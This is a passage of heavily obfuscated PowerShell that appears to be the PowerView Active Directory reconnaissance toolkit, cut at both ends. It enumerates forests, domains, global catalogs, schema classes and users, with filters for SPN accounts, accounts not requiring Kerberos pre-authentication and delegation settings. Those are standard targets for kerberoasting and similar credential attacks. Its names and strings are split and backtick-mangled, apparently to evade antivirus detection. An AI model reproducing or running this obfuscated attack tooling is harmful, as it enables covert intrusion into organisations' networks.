                &("{1}{2}{0}" -f'bose','Write-Ve','r') ('[Get-For'+'est'+'] '+'Th'+'e '+'s'+'pe'+'cif'+'ied '+'for'+'est'+' '+"'$Forest' "+'doe'+'s '+'n'+'ot '+'exis'+'t, '+'cou'+'ld '+'n'+'ot '+'b'+'e '+'c'+'o'+'ntact'+'ed, '+'o'+'r '+'there'+' '+('is'+'n{'+'0}t ') -F  [cHAR]39+'a'+'n '+'e'+'xist'+'ing '+'tru'+'st'+': '+"$_")
                return ${n`ULl}
            }
        }
        else {
            
            ${FOr`eS`T`o`BJEct} =  (VarIABLe ("H"+"T9")).vAluE::("{2}{3}{1}{0}"-f'orest','rentF','Get','Cur').Invoke()
        }

        if (${fOR`ESToBJe`ct}) {
            
            if (${pS`B`OUNdP`AR`AMETErS}[("{0}{1}{2}" -f'Cr','edenti','al')]) {
                ${F`oRE`sTS`iD} = (&("{1}{3}{2}{0}{4}" -f 'm','Ge','-Do','t','ainUser') -Identity ("{1}{0}" -f 'rbtgt','k') -Domain ${f`OREst`Ob`JecT}."roOt`DoM`A`In"."nA`mE" -Credential ${Cr`EdEnt`IaL})."ObJ`e`CT`sID"
            }
            else {
                ${foRE`st`SId} = (&("{0}{3}{2}{1}"-f 'Get','nUser','Domai','-') -Identity ("{0}{1}" -f'kr','btgt') -Domain ${fo`ReSto`Bj`EcT}."Roo`T`doM`AIN"."NA`mE")."oBjE`CTs`Id"
            }

            ${pa`RTS} = ${F`o`REstSId} -Split '-'
            ${forEsT`S`ID} = ${p`A`RtS}[0..$(${p`ARts}."lE`NgTh"-2)] -join '-'
            ${FOrEs`Tob`JEcT} | &("{0}{1}{2}" -f'A','dd-Mem','ber') ("{0}{1}{2}"-f 'N','oteP','roperty') ("{1}{4}{3}{2}{0}"-f'inSid','R','Doma','t','oo') ${F`O`ResTSid}
            ${ForEsTo`B`JECT}
        }
    }
}


function GET-`For`ES`TDoMAin {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}"-f'P','ss','SShouldPr','oce'}, '')]
    [OutputType({"{2}{3}{7}{6}{0}{4}{1}{8}{5}"-f'ActiveD','ect','System.D','irector','ir','Domain','.','yServices','ory.'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSItIOn = 0, VAlUEFROmPIPElINe = ${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`o`REst},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`DE`Nti`Al} =   $21Gv7e::"emp`TY"
    )

    PROCESS {
        ${A`RG`U`meNts} = @{}
        if (${p`SbOu`ND`PaR`AmeTERS}[("{1}{2}{0}" -f 'rest','F','o')]) { ${a`R`guMeNts}[("{1}{0}"-f 'orest','F')] = ${F`OR`eSt} }
        if (${psbO`UNDP`ArAM`ETerS}[("{2}{0}{1}" -f 'nt','ial','Crede')]) { ${a`RgumEn`Ts}[("{1}{0}{2}" -f 'r','C','edential')] = ${C`R`edentIAl} }

        ${F`OR`esToBje`Ct} = &("{1}{2}{0}{3}"-f 's','Ge','t-Fore','t') @Arguments
        if (${fOre`st`OBjecT}) {
            ${fo`ReSTO`B`jEcT}."D`oMAI`NS"
        }
    }
}


function gET`-`FORe`sT`gLo`BaLcatALOg {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}"-f 'ss','roce','PSShouldP'}, '')]
    [OutputType({"{13}{4}{6}{10}{8}{9}{1}{0}{11}{12}{3}{7}{2}{5}"-f 'r','ActiveDi','alo','Glob','ystem.Di','g','re','alCat','ervic','es.','ctoryS','ecto','ry.','S'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSItiOn = 0, VALuEFrOmPiPELIne = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`o`REst},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`d`e`NtiAL} =  (cHiLdITEM ('vA'+'R'+'iaBle:21'+'gv7E')).vALUE::"eM`PtY"
    )

    PROCESS {
        ${aRGU`mEn`TS} = @{}
        if (${PS`B`o`UndPaRaM`Et`ERs}[("{1}{0}" -f't','Fores')]) { ${A`RGuM`EnTs}[("{0}{1}"-f 'Fo','rest')] = ${f`oR`est} }
        if (${pS`BoUNd`P`AR`AmETERS}[("{1}{2}{0}"-f 'tial','Crede','n')]) { ${arG`U`MENtS}[("{0}{1}{2}"-f'Cred','e','ntial')] = ${cr`eDeNt`iAl} }

        ${foresTObJ`e`cT} = &("{1}{0}{2}"-f't-F','Ge','orest') @Arguments

        if (${f`OReSt`oBJEct}) {
            ${ForEsTob`J`ecT}.("{6}{5}{0}{1}{4}{3}{2}"-f'ndAl','lGlobal','logs','ta','Ca','i','F').Invoke()
        }
    }
}


function G`eT-`FOre`sTs`C`HeMAcL`ASS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}"-f 'PSSho','uld','rocess','P'}, '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTIoN = 0, VALUeFrOMPipeliNe = ${T`Rue})]
        [Alias({"{1}{0}" -f'lass','C'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cl`As`SnAMe},

        [Alias({"{0}{1}"-f 'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Fo`Re`St},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDE`NTIal} =  (GCi VaRIaBlE:21GV7e  ).vALuE::"E`mpty"
    )

    PROCESS {
        ${ARgum`e`Nts} = @{}
        if (${pSB`OU`N`d`pARaMe`TeRS}[("{1}{0}"-f 'rest','Fo')]) { ${arg`U`me`NTs}[("{0}{1}"-f'Fores','t')] = ${F`oReST} }
        if (${psb`oUNdPar`A`mEte`RS}[("{0}{2}{1}" -f'Cr','tial','eden')]) { ${arg`UME`NtS}[("{2}{1}{0}"-f'al','i','Credent')] = ${C`RedeN`TiAl} }

        ${fo`RESto`BjE`Ct} = &("{0}{1}{2}"-f 'Get-F','ores','t') @Arguments

        if (${fOre`SToB`je`ct}) {
            if (${PsB`ouN`dpARaME`T`ERS}[("{2}{0}{1}" -f 'lassNam','e','C')]) {
                ForEach (${tA`R`GET`cLaSS} in ${clASs`NA`mE}) {
                    ${F`or`EsTo`BjECt}."S`C`heMa".("{2}{1}{0}" -f'ss','la','FindC').Invoke(${t`Ar`geTclaSs})
                }
            }
            else {
                ${ForesT`Obj`e`Ct}."SCHE`MA".("{4}{2}{3}{0}{1}" -f'ass','es','C','l','FindAll').Invoke()
            }
        }
    }
}


function FinD-D`OMaINobJeC`TP`R`OPErtYOut`lI`er {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}"-f 'ul','PSSho','ocess','dPr'}, '')]
    [OutputType({"{6}{2}{1}{3}{7}{5}{4}{0}" -f'tlier','V','er','iew.Pr','Ou','y','Pow','opert'})]
    [CmdletBinding(dEFAULTpaRAmETerSETNAMe = {"{2}{0}{1}" -f 'Nam','e','Class'})]
    Param(
        [Parameter(PosITIoN = 0, maNdatOrY = ${tR`UE}, parAMetERsEtnaME = "C`lA`sSnaMe")]
        [Alias({"{1}{0}"-f 'ass','Cl'})]
        [ValidateSet({"{1}{0}" -f 'er','Us'}, {"{0}{1}"-f'Gr','oup'}, {"{2}{0}{1}"-f 'ompute','r','C'})]
        [String]
        ${C`L`ASsNAME},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${rEferE`NcepR`O`PErTYs`et},

        [Parameter(VaLuEFROMpiPeLinE = ${t`RUE}, MANDAtoRY = ${t`Rue}, paraMeterSETName = "r`EFEre`N`CeObjECT")]
        [PSCustomObject]
        ${R`EF`Er`ENce`OBJECt},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'ter','il','F'})]
        [String]
        ${ldA`p`FiLteR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'h','SPat','AD'})]
        [String]
        ${Se`A`RCh`BaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{2}{0}"-f'ler','Dom','ol','ainContr'})]
        [String]
        ${se`R`VeR},

        [ValidateSet({"{0}{1}" -f 'Ba','se'}, {"{1}{0}"-f 'vel','OneLe'}, {"{1}{0}" -f 'ubtree','S'})]
        [String]
        ${sEarcH`SC`o`Pe} = ("{0}{2}{1}" -f 'S','ee','ubtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reS`Ul`TPAgEs`i`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`er`VErtImE`LIm`IT},

        [Switch]
        ${to`mbs`TO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`dEN`TIAL} =   (  GET-VaRIablE 21GV7E  ).VaLuE::"eM`pTY"
    )

    BEGIN {
        ${USe`Rr`e`FeREncEprOPErTYS`eT} = @(("{2}{0}{1}"-f 'coun','t','admin'),("{0}{1}{2}{3}" -f'acco','unt','exp','ires'),("{3}{0}{4}{2}{1}" -f'ad','time','rd','b','passwo'),("{2}{1}{3}{0}"-f'nt','d','badpw','cou'),'cn',("{0}{2}{1}" -f'c','page','ode'),("{1}{2}{0}"-f 'de','co','untryco'),("{1}{2}{0}" -f 'ption','descr','i'), ("{0}{2}{1}" -f 'd','ayname','ispl'),("{5}{4}{2}{0}{1}{3}" -f'ed','n','sh','ame','gui','distin'),("{4}{1}{2}{0}{3}"-f 'ationd','eprop','ag','ata','dscor'),("{2}{1}{0}" -f'e','am','givenn'),("{0}{1}{2}" -f'i','nstancety','pe'),("{0}{3}{2}{4}{5}{6}{1}"-f'iscrit','ect','s','ical','yste','mob','j'),("{2}{0}{1}"-f'ast','logoff','l'),("{1}{0}{2}" -f'lo','last','gon'),("{0}{1}{2}{4}{3}"-f'lastlog','on','tim','mp','esta'),("{1}{2}{0}{3}"-f'u','loc','ko','ttime'),("{1}{2}{0}" -f't','logo','ncoun'),("{2}{1}{0}"-f 'rof','embe','m'),("{6}{0}{4}{1}{3}{2}{5}" -f 'ds','portede','ryptiontyp','nc','-sup','es','ms'),("{1}{0}"-f 'e','nam'),("{1}{0}{2}" -f 'categ','object','ory'),("{3}{2}{0}{1}" -f'as','s','tcl','objec'),("{2}{1}{0}"-f'id','ectgu','obj'),("{0}{1}{2}"-f 'ob','jectsi','d'),("{2}{0}{3}{4}{1}" -f'yg','pid','primar','r','ou'),("{1}{0}{2}"-f 'd','pw','lastset'),("{4}{0}{3}{2}{1}" -f'a','ame','untn','cco','sam'),("{0}{4}{2}{3}{1}" -f 'sama','pe','t','y','ccount'),'sn',("{5}{0}{3}{2}{4}{1}" -f'ount','rol','on','c','t','useracc'),("{0}{4}{2}{1}{3}" -f'us','lnam','pa','e','erprinci'),("{2}{0}{1}"-f 'nchange','d','us'),("{0}{3}{2}{1}" -f'u','ed','creat','sn'),("{2}{1}{0}" -f'changed','en','wh'),("{2}{0}{1}"-f 'encrea','ted','wh'))

        ${g`RoU`PrefEr`e`NCEpr`operTYset} = @(("{0}{1}{2}" -f'adminc','ou','nt'),'cn',("{2}{0}{1}" -f'cri','ption','des'),("{0}{1}{4}{2}{3}" -f 'd','ist','dnam','e','inguishe'),("{5}{4}{1}{3}{2}{0}" -f'ata','repr','ationd','opag','o','dsc'),("{0}{1}{2}"-f'gr','oup','type'),("{1}{2}{3}{0}" -f'etype','ins','t','anc'),("{5}{6}{3}{4}{1}{2}{0}" -f 'ct','yst','emobje','tic','als','is','cri'),("{1}{2}{0}" -f 'mber','m','e'),("{0}{1}{2}" -f'mem','ber','of'),("{1}{0}" -f 'ame','n'),("{2}{0}{3}{1}{4}" -f'j','atego','ob','ectc','ry'),("{2}{1}{0}" -f 's','las','objectc'),("{0}{2}{1}"-f 'ob','uid','jectg'),("{1}{0}" -f 'sid','object'),("{0}{3}{1}{2}" -f 'samac','ntn','ame','cou'),("{2}{0}{1}"-f 'o','unttype','samacc'),("{1}{0}{2}{3}" -f 'mf','syste','la','gs'),("{1}{0}{2}"-f'nchang','us','ed'),("{2}{0}{1}" -f'sncreat','ed','u'),("{2}{1}{0}{3}" -f'g','han','whenc','ed'),("{0}{1}{3}{2}" -f 'when','crea','ed','t'))

        ${co`Mpu`TERr`efeR`Enc`EpROPErt`yseT} = @(("{1}{0}{3}{2}" -f 'co','ac','pires','untex'),("{2}{0}{1}{3}"-f'passwordt','im','bad','e'),("{1}{2}{0}" -f'nt','badpwd','cou'),'cn',("{1}{0}"-f 'epage','cod'),("{2}{0}{1}" -f 'ntrycod','e','cou'),("{2}{1}{3}{5}{4}{0}"-f 'me','guis','distin','h','a','edn'),("{0}{1}{3}{2}" -f'dns','host','e','nam'),("{5}{4}{1}{3}{6}{2}{0}"-f'data','repr','tion','o','o','dsc','paga'),("{2}{0}{1}"-f 'nce','type','insta'),("{1}{4}{2}{0}{3}"-f'ystemob','i','criticals','ject','s'),("{1}{2}{0}" -f'ogoff','las','tl'),("{3}{1}{2}{0}"-f'on','astlo','g','l'),("{3}{2}{0}{1}"-f'gontimest','amp','astlo','l'),("{3}{0}{1}{2}{4}" -f 'yf','l','ag','localpolic','s'),("{1}{2}{0}"-f 'oncount','l','og'),("{5}{0}{6}{2}{4}{3}{1}"-f'ds-s','dencryptiontypes','p','e','port','ms','u'),("{0}{1}" -f 'na','me'),("{1}{2}{3}{0}"-f 'ctcategory','o','bj','e'),("{2}{3}{1}{0}"-f's','clas','ob','ject'),("{1}{0}{2}"-f 'j','ob','ectguid'),("{0}{2}{1}" -f 'objec','id','ts'),("{0}{1}{3}{2}" -f 'op','eratin','ystem','gs'),("{2}{0}{1}{4}{3}"-f'ra','tings','ope','temservicepack','ys'),("{1}{3}{2}{4}{0}" -f'ersion','ope','n','rati','gsystemv'),("{0}{1}{2}{3}"-f 'pr','im','arygroup','id'),("{0}{2}{1}"-f'pwdlast','t','se'),("{4}{0}{2}{1}{3}" -f'amacco','am','untn','e','s'),("{0}{1}{3}{2}" -f'sa','m','ttype','accoun'),("{4}{2}{5}{0}{1}{3}"-f'nc','ipa','i','lname','serv','cepri'),("{1}{0}{2}{3}"-f 'seraccountc','u','ontr','ol'),("{0}{1}{2}" -f 'us','nc','hanged'),("{0}{1}{2}"-f 'usnc','r','eated'),("{0}{2}{1}" -f 'wh','nged','encha'),("{2}{3}{0}{1}" -f'rea','ted','whe','nc'))

        ${SeArCHe`R`ARg`UM`E`NtS} = @{}
        if (${P`SB`ouNDpArA`M`eTeRs}[("{0}{1}"-f 'Do','main')]) { ${sEa`RChE`Rar`guMeNTs}[("{1}{0}{2}" -f 'omai','D','n')] = ${d`oM`AIN} }
        if (${PSbO`UnD`Par`A`mETerS}[("{2}{1}{0}" -f'ilter','APF','LD')]) { ${SeA`Rc`HER`ARgU`MEntS}[("{2}{0}{1}" -f 'DAPFilte','r','L')] = ${L`DA`pFILT`eR} }
        if (${PsbOu`NdpAra`mETE`RS}[("{2}{0}{1}" -f 'hBa','se','Searc')]) { ${S`EarCh`e`RARGumENts}[("{1}{0}{2}"-f 'rchB','Sea','ase')] = ${s`Ear`Chba`SE} }
        if (${P`SBOUN`DPArA`mEte`RS}[("{0}{1}"-f 'S','erver')]) { ${sEar`cheR`ArgUME`N`TS}[("{2}{1}{0}"-f'r','erve','S')] = ${sE`Rv`er} }
        if (${ps`BO`Un`dPARaMEt`ErS}[("{2}{0}{3}{1}" -f 'archS','ope','Se','c')]) { ${SEa`RCHE`RARguME`N`Ts}[("{1}{3}{0}{2}" -f 'op','Sea','e','rchSc')] = ${S`EA`RCHSc`ope} }
        if (${p`SbOUNDP`ARAMEtE`RS}[("{0}{2}{1}"-f'ResultP','Size','age')]) { ${seaR`Ch`ERaRgU`MENtS}[("{0}{2}{1}"-f'ResultP','Size','age')] = ${ResU`l`T`pA`gesIze} }
        if (${P`sboUNdPArame`T`eRs}[("{2}{0}{1}{3}" -f've','rTimeLi','Ser','mit')]) { ${Sea`RCHe`R`ARG`UmENts}[("{2}{3}{1}{0}" -f 'imit','imeL','Server','T')] = ${Serv`E`RTiMELImIt} }
        if (${psb`Oun`dPA`RaMEt`ERs}[("{0}{1}{2}" -f'T','ombston','e')]) { ${sE`A`RcheRaRgu`men`TS}[("{0}{1}"-f 'To','mbstone')] = ${to`m`BST`OnE} }
        if (${Psb`ou`Ndpar`A`meTeRS}[("{2}{0}{1}" -f 'a','l','Credenti')]) { ${SeaR`cHErar`G`Ume`NTS}[("{0}{1}{2}{3}" -f 'Cr','ed','ent','ial')] = ${cre`DEnT`IAl} }

        
        if (${Ps`Bou`N`dpArAMEtE`RS}[("{2}{1}{0}"-f 'n','i','Doma')]) {
            if (${Psb`oUndPARa`Mete`Rs}[("{0}{2}{1}" -f'Cr','l','edentia')]) {
                ${tar`G`ETFO`REST} = &("{1}{0}{2}" -f'i','Get-Doma','n') -Domain ${doM`AIN} | &("{2}{1}{0}{3}" -f 't-Ob','elec','S','ject') -ExpandProperty ("{1}{0}" -f 'rest','Fo') | &("{2}{0}{1}"-f'Ob','ject','Select-') -ExpandProperty ("{1}{0}" -f'ame','N')
            }
            else {
                ${TARGEtf`O`REST} = &("{2}{3}{1}{0}" -f 'omain','-D','Ge','t') -Domain ${dO`ma`in} -Credential ${CREDEN`Ti`Al} | &("{1}{2}{0}" -f 'bject','Select','-O') -ExpandProperty ("{1}{0}"-f 'rest','Fo') | &("{3}{2}{0}{1}" -f 'bjec','t','t-O','Selec') -ExpandProperty ("{1}{0}"-f'ame','N')
            }
            &("{1}{0}{2}" -f 'te','Wri','-Verbose') ('[Fi'+'nd-'+'D'+'omai'+'nObjectP'+'rop'+'e'+'rtyOut'+'li'+'er] '+'Enume'+'rated'+' '+'for'+'est '+"'$TargetForest' "+'fo'+'r '+'targe'+'t '+'dom'+'ain'+' '+"'$Domain'")
        }

        ${Sc`HeM`AARGu`mE`NTs} = @{}
        if (${P`Sb`o`U`NdPa`RAMetErS}[("{0}{2}{1}"-f 'Cre','ntial','de')]) { ${sc`hEMAAr`G`UM`eNts}[("{1}{0}{2}" -f 'a','Credenti','l')] = ${CRe`deNt`i`Al} }
        if (${t`ArG`etFORE`st}) {
            ${SCHE`MAAr`Gu`ME`NTs}[("{0}{1}"-f 'For','est')] = ${tarGETF`Or`e`St}
        }
    }

    PROCESS {

        if (${psBou`NDPara`m`eTE`RS}[("{0}{2}{1}{3}" -f'Re','c','feren','ePropertySet')]) {
            &("{2}{1}{0}" -f'se','ite-Verbo','Wr') ("{5}{9}{3}{7}{2}{13}{16}{15}{12}{4}{0}{1}{6}{10}{11}{14}{8}"-f '-','R','jectPrope','omai',' ','[Fin','efer','nOb','rtySet','d-D','enceP','r','ified','rtyOutlier] Usin','ope','ec','g sp')
            ${R`EFe`RE`NCEo`B`JeCtPrOperTIEs} = ${R`EfErenc`ePr`o`PE`RTySet}
        }
        elseif (${PSBou`Ndp`ARA`M`EterS}[("{2}{0}{1}" -f 'erenc','eObject','Ref')]) {
            &("{3}{0}{2}{1}"-f'ite','ose','-Verb','Wr') ("{17}{27}{29}{16}{4}{30}{18}{10}{21}{26}{28}{2}{14}{9}{22}{6}{20}{7}{13}{19}{31}{11}{5}{3}{15}{23}{25}{0}{8}{24}{1}{12}"-f'e pro','y ','o','s th','ectPrope','a','ames from -Refer','n','per','e','r] Extrac','use ','set','ceObje','p','e ','nObj','[F','yOutlie','ct ','e','ti','rty n','refe','t','renc','ng ','ind-Do','pr','mai','rt','to ')
            ${Re`Fer`EncEobjeC`TpROPE`RTiES} = &("{0}{2}{1}" -f 'G','r','et-Membe') -InputObject ${ReFE`R`en`c`EobJeCT} -MemberType ("{0}{3}{1}{2}" -f 'No','Propert','y','te') | &("{3}{1}{2}{0}" -f 'ct','ec','t-Obje','Sel') -Expand ("{1}{0}"-f 'ame','N')
            ${Refe`REN`ceObjecTcL`A`Ss} = ${R`e`F`EReNCeoBJECt}."Obj`e`ctCL`ASS" | &("{3}{1}{0}{2}{4}" -f 'c','le','t-Ob','Se','ject') -Last 1
            &("{0}{1}{2}{3}" -f 'W','rit','e-V','erbose') ('['+'Find-'+'DomainObjec'+'tPro'+'p'+'er'+'tyOu'+'tli'+'e'+'r] '+'Calcul'+'at'+'e'+'d '+'R'+'ef'+'erence'+'Ob'+'jectCl'+'ass '+': '+"$ReferenceObjectClass")
        }
        else {
            &("{0}{1}{3}{2}{4}" -f 'Write','-Ve','os','rb','e') ('[Fi'+'nd-'+'D'+'o'+'main'+'O'+'bjectPr'+'op'+'ertyO'+'utlier] '+'Usin'+'g '+'th'+'e '+'def'+'aul'+'t '+'ref'+'e'+'rence'+' '+'pr'+'op'+'erty '+'se'+'t '+'f'+'or '+'th'+'e '+'objec'+'t'+' '+'cl'+'ass '+"'$ClassName'")
        }

        if ((${cLa`SSN`A`mE} -eq ("{0}{1}" -f 'Us','er')) -or (${REfERe`NCEOBJect`CL`ASS} -eq ("{0}{1}" -f 'Use','r'))) {
            ${oB`Jec`Ts} = &("{1}{0}{2}" -f'D','Get-','omainUser') @SearcherArguments
            if (-not ${REFE`R`eNc`EobJECt`prOPe`RtieS}) {
                ${rEf`e`ReNCE`O`B`JeCTprO`P`ertIEs} = ${U`sErR`eFEre`NC`E`PRopERT`y`sET}
            }
        }
        elseif ((${c`lassN`A`me} -eq ("{1}{0}"-f 'p','Grou')) -or (${Ref`ereNC`EoB`JEcTc`LaSS} -eq ("{1}{0}"-f'p','Grou'))) {
            ${OBJE`c`Ts} = &("{0}{3}{2}{1}" -f 'G','ainGroup','-Dom','et') @SearcherArguments
            if (-not ${REf`E`R`EncEobJECTproP`erTiEs}) {
                ${r`e`FE`Re`NceOBjE`CTPROp`eRtiEs} = ${gRoUpRE`Fer`E`NC`epr`OP`E`RtySEt}
            }
        }
        elseif ((${ClA`ssna`me} -eq ("{2}{1}{0}" -f'ter','ompu','C')) -or (${reFErEncEo`BJE`CT`CLA`sS} -eq ("{1}{0}{2}" -f 'put','Com','er'))) {
            ${OB`j`ectS} = &("{5}{3}{2}{1}{0}{4}" -f 'ompu','ainC','om','-D','ter','Get') @SearcherArguments
            if (-not ${R`ef`ERen`ceobjec`TpROpE`RtIeS}) {
                ${R`EFEre`N`cEobJe`C`TproPE`RTIEs} = ${C`ompUTeR`REFErenCE`prO`p`ErtYSeT}
            }
        }
        else {
            throw ('[Find'+'-D'+'o'+'mai'+'n'+'O'+'bjectProp'+'ertyOut'+'lier]'+' '+'I'+'n'+'valid '+'cla'+'ss: '+"$ClassName")
        }

        ForEach (${o`BjE`ct} in ${o`B`jEcts}) {
            ${O`Bj`e`ctPrOpE`RtiEs} = &("{1}{0}{2}" -f 'e','G','t-Member') -InputObject ${Ob`Je`CT} -MemberType ("{2}{0}{1}"-f'rope','rty','NoteP') | &("{2}{0}{1}" -f 'ect-','Object','Sel') -Expand ("{1}{0}"-f'me','Na')
            ForEach(${O`BjEc`T`PrOPERtY} in ${O`BjE`cTpROpe`Rti`es}) {
                if (${rEFeRe`NceobJ`ectP`ROPer`Ties} -NotContains ${o`BJEcTP`Rope`RTY}) {
                    ${o`Ut} = &("{2}{1}{0}"-f 't','jec','New-Ob') ("{1}{0}{2}" -f'jec','PSOb','t')
                    ${o`UT} | &("{2}{1}{0}" -f'ber','Mem','Add-') ("{1}{0}{2}"-f'pr','Note','operty') ("{0}{2}{1}" -f 'SamAcco','me','untNa') ${oB`jecT}."samACc`OU`NTna`Me"
                    ${O`Ut} | &("{0}{1}{2}" -f 'Add-Me','m','ber') ("{2}{1}{0}"-f'ty','roper','Notep') ("{1}{0}{2}" -f 'opert','Pr','y') ${Ob`jec`T`pr`oPeRtY}
                    ${O`Ut} | &("{2}{1}{0}{3}"-f'-Mem','dd','A','ber') ("{1}{0}{3}{2}"-f 'oteprope','N','y','rt') ("{0}{1}"-f 'V','alue') ${OB`jE`cT}.${OB`JeC`Tpr`o`PErTy}
                    ${O`UT}."psO`BJecT"."T`Y`PENaMEs".("{1}{2}{0}"-f 'sert','I','n').Invoke(0, ("{0}{1}{3}{2}{5}{4}" -f 'Po','w','rView','e','ropertyOutlier','.P'))
                    ${O`UT}
                }
            }
        }
    }
}








function GEt`-`Dom`AINU`sER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{4}{1}{9}{7}{10}{3}{0}{2}{5}{8}"-f 'nAs','ar','signme','a','laredV','nt','PSUseDec','T','s','sMore','h'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{4}{3}" -f'houl','dP','PSS','ocess','r'}, '')]
    [OutputType({"{2}{1}{3}{0}{4}"-f 'iew.Us','wer','Po','V','er'})]
    [OutputType({"{1}{3}{5}{4}{2}{0}"-f 'Raw','Po','r.','werV','se','iew.U'})]
    [CmdletBinding(DEFAuLtparamETErSETnAME = {"{3}{0}{2}{1}"-f 'lega','ion','t','AllowDe'})]
    Param(
        [Parameter(pOsitIOn = 0, vALUEFrOmpIPeLine = ${tR`UE}, vAlUEfRomPiPeLiNEBYProPeRTynAME = ${tR`UE})]
        [Alias({"{3}{1}{0}{2}" -f 'ishedNa','ingu','me','Dist'}, {"{3}{2}{0}{1}" -f 'AccountNam','e','am','S'}, {"{1}{0}" -f'ame','N'}, {"{2}{0}{4}{5}{1}{3}" -f 'berDi','edNam','Mem','e','stingu','ish'}, {"{1}{0}{2}{3}" -f'embe','M','rN','ame'})]
        [String[]]
        ${id`En`TITY},

        [Switch]
        ${s`pN},

        [Switch]
        ${a`D`m`InCount},

        [Parameter(PaRameteRSeTNAMe = "A`lLO`WDeL`EGaTIoN")]
        [Switch]
        ${a`l`Lowd`ELeGATiOn},

        [Parameter(PARameTeRsETNaME = "d`ISaLlO`WdEl`E`GAtIOn")]
        [Switch]
        ${Di`salLow`dEle`g`A`TioN},

        [Switch]
        ${tRU`stEd`TOAUTh},

        [Alias({"{0}{1}{5}{3}{4}{2}{6}" -f 'Ke','r','uire','hN','otReq','berosPreaut','d'}, {"{1}{0}{2}"-f 'ut','NoPrea','h'})]
        [Switch]
        ${p`REAuT`hN`otR`EQU`iREd},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOMa`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'er','Filt'})]
        [String]
        ${LdApfi`LT`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PrOPe`Rti`ES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'ADS','ath','P'})]
        [String]
        ${SEAr`CHba`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{3}{4}"-f 'D','r','omainCont','olle','r'})]
        [String]
        ${S`ErVeR},

        [ValidateSet({"{1}{0}" -f'e','Bas'}, {"{2}{0}{1}"-f 'e','Level','On'}, {"{1}{2}{0}" -f'ree','S','ubt'})]
        [String]
        ${sea`R`chs`cope} = ("{1}{2}{0}"-f'tree','Su','b'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`s`UlTPAgesi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`R`VeR`TIme`Lim`iT},

        [ValidateSet({"{1}{0}"-f'l','Dac'}, {"{0}{1}"-f'Grou','p'}, {"{1}{0}"-f 'one','N'}, {"{0}{1}"-f 'O','wner'}, {"{1}{0}"-f'acl','S'})]
        [String]
        ${S`Ecuri`TY`MA`Sks},

        [Switch]
        ${tomB`s`TOne},

        [Alias({"{1}{0}"-f'e','ReturnOn'})]
        [Switch]
        ${finDO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`Denti`AL} =  (  GEt-VARIaBLE  ("2"+"1Gv7e") -VALuEOn)::"Emp`TY",

        [Switch]
        ${r`AW}
    )

    DynamicParam {
        ${UAC`V`A`lUENAMES} =  (  vaRIabLE 6hei4 -VaLUE  )::("{1}{2}{0}" -f 's','G','etName').Invoke(${uA`C`Enum})
        
        ${U`Acv`ALuE`NaMES} = ${u`A`CvaL`UEnamEs} | &("{1}{2}{0}"-f'ch-Object','ForE','a') {${_}; "NOT_$_"}
        
        &("{2}{3}{5}{4}{0}{1}" -f 'cParamet','er','New','-','ynami','D') -Name ("{2}{1}{0}" -f'r','ACFilte','U') -ValidateSet ${U`A`CVAluEnaMes} -Type ([array])
    }

    BEGIN {
        ${sE`ArcHe`RA`R`GuMENTs} = @{}
        if (${PSBOUn`d`P`ARAm`EtERS}[("{0}{1}" -f'D','omain')]) { ${SEaRc`H`ERargU`MENts}[("{0}{1}"-f'Domai','n')] = ${D`o`MaiN} }
        if (${ps`Bo`UNDParA`mETERs}[("{2}{1}{0}" -f's','ropertie','P')]) { ${seAR`c`h`Era`RgUMeN`Ts}[("{1}{0}{2}"-f'rop','P','erties')] = ${Pr`OPErTI`eS} }
        if (${pSb`o`U`Ndp`ARAmeters}[("{0}{3}{1}{2}"-f 'S','chBas','e','ear')]) { ${S`EARcherA`RGuMEN`Ts}[("{2}{0}{1}"-f 'e','archBase','S')] = ${S`EaRch`B`Ase} }
        if (${PsbounDpA`RAM`E`TeRs}[("{0}{1}"-f'Ser','ver')]) { ${seA`RC`He`RaRgUm`e`NTS}[("{0}{1}" -f 'Serv','er')] = ${SER`V`ER} }
        if (${pSBOU`ND`pArAM`eTeRS}[("{3}{1}{2}{0}" -f'cope','arc','hS','Se')]) { ${se`A`R`cHerarG`UMEnTs}[("{1}{3}{2}{0}" -f 'pe','Sear','co','chS')] = ${SE`ArchS`cO`PE} }
